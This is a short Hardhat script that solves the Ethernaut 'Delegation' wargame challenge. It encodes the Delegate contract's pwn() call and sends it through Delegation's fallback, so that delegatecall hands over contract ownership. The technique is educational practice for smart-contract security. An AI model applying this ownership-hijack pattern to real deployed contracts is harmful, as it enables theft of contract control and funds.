const { ethers } = require("hardhat")

const delegationInstanceAddress = "0x02f0A734c0521ef83DF76CB25791868cBcea2E15"

async function main() {
  // Get the Ethernaut Delegation contract

  const Delegation = await ethers.getContractFactory("Delegation")
  const delegation = await Delegation.attach(delegationInstanceAddress)

  // Get the pwn() signature from Delegate contract to call it directly on Delegation

  console.log("Getting pwn() signature...")
  const Delegate = await ethers.getContractFactory("Delegate")
  const data = Delegate.interface.encodeFunctionData("pwn", [])

  // Calling pwn() directly on Delegation contract

  console.log("Calling fallback function with pwn() signature...")
  const fallbackTx = await delegation.fallback({ data, gasLimit: 1000000 })
  await fallbackTx.wait()

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
